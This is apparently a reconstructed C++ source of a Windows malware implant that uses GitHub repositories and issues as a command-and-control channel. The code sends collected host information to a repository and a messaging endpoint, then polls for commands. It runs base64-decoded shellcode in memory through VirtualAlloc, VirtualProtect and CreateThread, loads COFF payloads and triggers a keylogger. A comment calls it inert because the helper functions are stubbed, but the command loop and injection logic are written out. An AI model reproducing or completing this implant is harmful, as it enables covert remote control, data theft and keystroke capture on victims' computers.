#include <windows.h>
#include <string>
using std::string;
// External adapters make this an inert source reconstruction, not a working implant.
extern string http(const char *method, const string &url, const string &body);
extern string decrypt_command(const string &encoded, const string &filename);
extern string field(const string &json, const char *key);
extern string base64_decode(const string &value);
extern string random_id();
extern string collect_host_info();
extern string encrypt_response(const string &data, const string &filename);
extern string enumerate_host_id_command(const string &listing, const string &host_id);
extern void keylogger(const string &command);
extern void coff_go(const string &bytes, const string &arguments);

void serve() {
    string host_id = random_id();
    string taskrepo = "https://api.github.com/repos/ResearchAccount/Queue/contents/";
    string resultrepo = "https://api.github.com/repos/ResearchAccount/Results/contents/";
    http("POST", "https://api.github.com/repos/ResearchAccount/Results/issues",
         "{\"body\":\"code " + host_id + "\",\"title\":\"problem " + random_id() + "\"}");
    string name = "main." + host_id + ".js.map";
    string info = encrypt_response(collect_host_info(), name);
    http("PUT", resultrepo + name, "{\"content\":\"" + info + "\",\"message\":\"commit from CLIENT\"}");
    http("POST", "https://messaging.example.invalid/messages", info);
    for (;;) {
        string filename = enumerate_host_id_command(http("GET", taskrepo, ""), host_id);
        string command = decrypt_command(http("GET", taskrepo + filename, ""), filename);
        string op = field(command, "command");
        if (op == "exit") break;
        if (op == "scload") coff_go(base64_decode(field(command, "data")), field(command, "args"));
        if (op == "smload") {
            string payload = base64_decode(field(command, "data"));
            void *stage = VirtualAlloc(nullptr, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            RtlMoveMemory(stage, payload.data(), payload.size());
            DWORD old;
            VirtualProtect(stage, payload.size(), PAGE_EXECUTE_READWRITE, &old);
            CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)stage, nullptr, 0, nullptr);
        }
        if (filename.ends_with(".kmap")) keylogger(command);
        string result = "{\"result_type\" : \"keylogger_status\",\"type\":\"serv\"}";
        http("PUT", resultrepo + filename, encrypt_response(result, filename));
        Sleep(1000);
    }
}
